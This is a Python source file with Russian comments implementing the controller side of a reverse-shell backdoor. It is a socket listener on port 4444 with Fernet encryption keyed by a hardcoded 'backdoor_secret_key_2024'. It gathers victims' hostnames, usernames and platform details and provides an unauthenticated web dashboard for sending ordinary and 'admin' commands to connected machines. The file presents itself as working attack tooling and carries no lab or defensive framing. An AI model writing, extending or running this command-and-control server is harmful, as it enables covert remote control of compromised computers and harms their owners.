#!/usr/bin/env python3
"""
Серверная часть для Reverse Shell.
Обеспечивает управление подключениями и веб-интерфейс.
"""

import socket
import threading
import json
import time
import base64
import logging
from typing import Dict, List, Optional, Any
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import http.server
import socketserver
import urllib.parse
import os

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ReverseShellServer:
    """Сервер для управления reverse shell соединениями."""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 4444, 
                 encryption_key: str = "backdoor_secret_key_2024"):
        """
        Инициализация сервера.
        
        Args:
            host: IP адрес для прослушивания
            port: Порт для прослушивания
            encryption_key: Ключ для шифрования
        """
        self.host = host
        self.port = port
        self.encryption_key = encryption_key
        self.fernet = self._create_fernet()
        self.server_socket = None
        self.is_running = False
        self.clients: Dict[str, Dict[str, Any]] = {}
        self.client_lock = threading.Lock()
        
    def _create_fernet(self) -> Fernet:
        """Создает Fernet объект для шифрования."""
        try:
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b'backdoor_salt_2024',
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(self.encryption_key.encode()))
            return Fernet(key)
        except Exception as e:
            logger.error(f"Ошибка создания ключа шифрования: {e}")
            return Fernet(base64.urlsafe_b64encode(self.encryption_key.encode().ljust(32)[:32]))
    
    def _encrypt_data(self, data: str) -> bytes:
        """Шифрует данные."""
        try:
            return self.fernet.encrypt(data.encode('utf-8'))
        except Exception as e:
            logger.error(f"Ошибка шифрования: {e}")
            return data.encode('utf-8')
    
    def _decrypt_data(self, data: bytes) -> str:
        """Расшифровывает данные."""
        try:
            return self.fernet.decrypt(data).decode('utf-8')
        except Exception as e:
            logger.error(f"Ошибка расшифровки: {e}")
            return data.decode('utf-8', errors='ignore')
    
    def _send_data(self, client_socket: socket.socket, data: str) -> bool:
        """Отправляет зашифрованные данные клиенту."""
        try:
            encrypted_data = self._encrypt_data(data)
            length = len(encrypted_data)
            client_socket.send(length.to_bytes(4, byteorder='big'))
            client_socket.send(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Ошибка отправки данных: {e}")
            return False
    
    def _receive_data(self, client_socket: socket.socket) -> Optional[str]:
        """Получает и расшифровывает данные от клиента."""
        try:
            # Получаем длину данных
            length_data = client_socket.recv(4)
            if not length_data:
                return None
            
            length = int.from_bytes(length_data, byteorder='big')
            
            # Получаем данные
            data = b''
            while len(data) < length:
                chunk = client_socket.recv(length - len(data))
                if not chunk:
                    break
                data += chunk
            
            if data:
                return self._decrypt_data(data)
        except Exception as e:
            logger.error(f"Ошибка получения данных: {e}")
        return None
    
    def _handle_client(self, client_socket: socket.socket, client_address: tuple):
        """Обрабатывает подключение клиента."""
        client_id = f"{client_address[0]}:{client_address[1]}"
        logger.info(f"Новое подключение: {client_id}")
        
        # Инициализируем клиента
        with self.client_lock:
            self.clients[client_id] = {
                "socket": client_socket,
                "address": client_address,
                "connected_at": datetime.now(),
                "last_activity": datetime.now(),
                "system_info": {},
                "is_active": True
            }
        
        try:
            while self.is_running:
                # Получаем данные от клиента
                data = self._receive_data(client_socket)
                if data is None:
                    break
                
                # Обновляем время последней активности
                with self.client_lock:
                    if client_id in self.clients:
                        self.clients[client_id]["last_activity"] = datetime.now()
                
                # Обрабатываем входящие данные
                if data.startswith("CONNECT:"):
                    # Получаем информацию о системе
                    system_info = data[8:]
                    try:
                        system_info_dict = json.loads(system_info)
                        with self.client_lock:
                            if client_id in self.clients:
                                self.clients[client_id]["system_info"] = system_info_dict
                        logger.info(f"Получена информация о системе от {client_id}")
                    except:
                        pass
                else:
                    # Это результат выполнения команды
                    logger.info(f"Получен результат от {client_id}: {data[:100]}...")
                
        except Exception as e:
            logger.error(f"Ошибка обработки клиента {client_id}: {e}")
        finally:
            # Удаляем клиента
            with self.client_lock:
                if client_id in self.clients:
                    del self.clients[client_id]
            
            try:
                client_socket.close()
            except:
                pass
            
            logger.info(f"Клиент отключен: {client_id}")
    
    def _accept_connections(self):
        """Принимает новые подключения."""
        while self.is_running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                client_thread.start()
            except Exception as e:
                if self.is_running:
                    logger.error(f"Ошибка принятия подключения: {e}")
    
    def start(self):
        """Запускает сервер."""
        if self.is_running:
            logger.warning("Сервер уже запущен")
            return
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1)
            
            self.is_running = True
            logger.info(f"Reverse Shell сервер запущен на {self.host}:{self.port}")
            
            # Запускаем поток для принятия подключений
            self.accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            self.accept_thread.start()
            
        except Exception as e:
            logger.error(f"Ошибка запуска сервера: {e}")
            self.is_running = False
    
    def stop(self):
        """Останавливает сервер."""
        self.is_running = False
        
        # Закрываем все клиентские соединения
        with self.client_lock:
            for client_id, client_data in self.clients.items():
                try:
                    client_data["socket"].close()
                except:
                    pass
            self.clients.clear()
        
        # Закрываем серверный сокет
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        logger.info("Reverse Shell сервер остановлен")
    
    def get_clients(self) -> List[Dict[str, Any]]:
        """Возвращает список активных клиентов."""
        with self.client_lock:
            clients_list = []
            for client_id, client_data in self.clients.items():
                if client_data["is_active"]:
                    clients_list.append({
                        "id": client_id,
                        "address": client_data["address"],
                        "connected_at": client_data["connected_at"].isoformat(),
                        "last_activity": client_data["last_activity"].isoformat(),
                        "system_info": client_data["system_info"]
                    })
            return clients_list
    
    def send_command(self, client_id: str, command: str, admin: bool = False) -> bool:
        """Отправляет команду клиенту."""
        with self.client_lock:
            if client_id not in self.clients:
                return False
            
            client_data = self.clients[client_id]
            if not client_data["is_active"]:
                return False
            
            try:
                # Формируем команду
                if admin:
                    full_command = f"ADMIN_CMD:{command}"
                else:
                    full_command = f"CMD:{command}"
                
                # Отправляем команду
                return self._send_data(client_data["socket"], full_command)
                
            except Exception as e:
                logger.error(f"Ошибка отправки команды клиенту {client_id}: {e}")
                return False
    
    def get_status(self) -> Dict[str, Any]:
        """Возвращает статус сервера."""
        return {
            "is_running": self.is_running,
            "host": self.host,
            "port": self.port,
            "clients_count": len(self.clients),
            "uptime": time.time() if self.is_running else 0
        }


class WebInterface:
    """Веб-интерфейс для управления reverse shell сервером."""
    
    def __init__(self, server: ReverseShellServer, web_port: int = 8080):
        self.server = server
        self.web_port = web_port
        self.is_running = False
    
    def _generate_html(self) -> str:
        """Генерирует HTML страницу."""
        clients = self.server.get_clients()
        status = self.server.get_status()
        
        html = f"""
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reverse Shell Dashboard</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }}
        .status {{
            background: #ecf0f1;
            padding: 15px;
            margin: 20px;
            border-radius: 5px;
            border-left: 4px solid #3498db;
        }}
        .clients {{
            margin: 20px;
        }}
        .client {{
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 10px;
        }}
        .client-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }}
        .client-id {{
            font-weight: bold;
            color: #2c3e50;
        }}
        .client-status {{
            padding: 5px 10px;
            border-radius: 15px;
            font-size: 12px;
            font-weight: bold;
        }}
        .status-active {{
            background: #d4edda;
            color: #155724;
        }}
        .command-form {{
            margin-top: 10px;
            padding: 10px;
            background: #e9ecef;
            border-radius: 5px;
        }}
        .command-input {{
            width: 70%;
            padding: 8px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            margin-right: 10px;
        }}
        .btn {{
            padding: 8px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 5px;
        }}
        .btn-primary {{
            background: #007bff;
            color: white;
        }}
        .btn-danger {{
            background: #dc3545;
            color: white;
        }}
        .btn:hover {{
            opacity: 0.8;
        }}
        .system-info {{
            background: #f1f3f4;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            margin-top: 10px;
        }}
        .refresh-btn {{
            background: #28a745;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🖥️ Reverse Shell Dashboard</h1>
            <p>Управление подключенными устройствами</p>
        </div>
        
        <div class="status">
            <h3>📊 Статус сервера</h3>
            <p><strong>Статус:</strong> {'🟢 Работает' if status['is_running'] else '🔴 Остановлен'}</p>
            <p><strong>Адрес:</strong> {status['host']}:{status['port']}</p>
            <p><strong>Подключенных клиентов:</strong> {status['clients_count']}</p>
        </div>
        
        <button class="refresh-btn" onclick="location.reload()">🔄 Обновить</button>
        
        <div class="clients">
            <h3>🖥️ Подключенные устройства ({len(clients)})</h3>
            {self._generate_clients_html(clients)}
        </div>
    </div>
    
    <script>
        function sendCommand(clientId, admin = false) {{
            const input = document.getElementById('cmd-' + clientId);
            const command = input.value.trim();
            if (!command) return;
            
            const url = admin ? 
                `/admin_command?client=${clientId}&command=${encodeURIComponent(command)}` :
                `/command?client=${clientId}&command=${encodeURIComponent(command)}`;
            
            fetch(url)
                .then(response => response.text())
                .then(result => {{
                    alert('Команда отправлена: ' + result);
                    input.value = '';
                }})
                .catch(error => {{
                    alert('Ошибка отправки команды: ' + error);
                }});
        }}
        
        // Автообновление каждые 30 секунд
        setInterval(() => {{
            location.reload();
        }}, 30000);
    </script>
</body>
</html>
        """
        return html
    
    def _generate_clients_html(self, clients: List[Dict[str, Any]]) -> str:
        """Генерирует HTML для списка клиентов."""
        if not clients:
            return '<p>Нет подключенных устройств</p>'
        
        html = ""
        for client in clients:
            system_info = client.get('system_info', {})
            platform = system_info.get('platform', 'Unknown')
            hostname = system_info.get('hostname', 'Unknown')
            username = system_info.get('username', 'Unknown')
            
            html += f"""
            <div class="client">
                <div class="client-header">
                    <span class="client-id">🖥️ {client['id']}</span>
                    <span class="client-status status-active">🟢 Активен</span>
                </div>
                <p><strong>Платформа:</strong> {platform}</p>
                <p><strong>Хост:</strong> {hostname}</p>
                <p><strong>Пользователь:</strong> {username}</p>
                <p><strong>Подключен:</strong> {client['connected_at']}</p>
                <p><strong>Последняя активность:</strong> {client['last_activity']}</p>
                
                <div class="command-form">
                    <input type="text" id="cmd-{client['id']}" class="command-input" 
                           placeholder="Введите команду..." onkeypress="if(event.keyCode==13) sendCommand('{client['id']}')">
                    <button class="btn btn-primary" onclick="sendCommand('{client['id']}')">Выполнить</button>
                    <button class="btn btn-danger" onclick="sendCommand('{client['id']}', true)">Админ</button>
                </div>
                
                <div class="system-info">
                    <strong>Системная информация:</strong><br>
                    {json.dumps(system_info, ensure_ascii=False, indent=2)}
                </div>
            </div>
            """
        
        return html


class WebHandler(http.server.BaseHTTPRequestHandler):
    """HTTP обработчик для веб-интерфейса."""
    
    def __init__(self, *args, server_instance=None, **kwargs):
        self.server_instance = server_instance
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Обрабатывает GET запросы."""
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        if path == '/':
            # Главная страница
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            web_interface = WebInterface(self.server_instance)
            html = web_interface._generate_html()
            self.wfile.write(html.encode('utf-8'))
            
        elif path == '/command':
            # Выполнение обычной команды
            query = urllib.parse.parse_qs(parsed_path.query)
            client_id = query.get('client', [''])[0]
            command = query.get('command', [''])[0]
            
            if client_id and command:
                success = self.server_instance.send_command(client_id, command, admin=False)
                result = "Команда отправлена" if success else "Ошибка отправки команды"
            else:
                result = "Неверные параметры"
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain; charset=utf-8')
            self.end_headers()
            self.wfile.write(result.encode('utf-8'))
            
        elif path == '/admin_command':
            # Выполнение команды администратора
            query = urllib.parse.parse_qs(parsed_path.query)
            client_id = query.get('client', [''])[0]
            command = query.get('command', [''])[0]
            
            if client_id and command:
                success = self.server_instance.send_command(client_id, command, admin=True)
                result = "Команда администратора отправлена" if success else "Ошибка отправки команды"
            else:
                result = "Неверные параметры"
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain; charset=utf-8')
            self.end_headers()
            self.wfile.write(result.encode('utf-8'))
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')
    
    def log_message(self, format, *args):
        """Отключает логирование HTTP запросов."""
        pass


def start_server_with_web(host: str = "0.0.0.0", port: int = 4444, 
                         web_port: int = 8080, 
                         encryption_key: str = "backdoor_secret_key_2024"):
    """Запускает сервер с веб-интерфейсом."""
    
    # Создаем сервер
    server = ReverseShellServer(host, port, encryption_key)
    server.start()
    
    # Создаем веб-сервер
    class CustomHandler(WebHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, server_instance=server, **kwargs)
    
    try:
        with socketserver.TCPServer(("0.0.0.0", web_port), CustomHandler) as httpd:
            print(f"🌐 Веб-интерфейс доступен по адресу: http://localhost:{web_port}")
            print(f"🔧 Reverse Shell сервер работает на {host}:{port}")
            print("💡 Используйте Ctrl+C для остановки")
            
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Остановка сервера...")
    finally:
        server.stop()


if __name__ == "__main__":
    start_server_with_web()
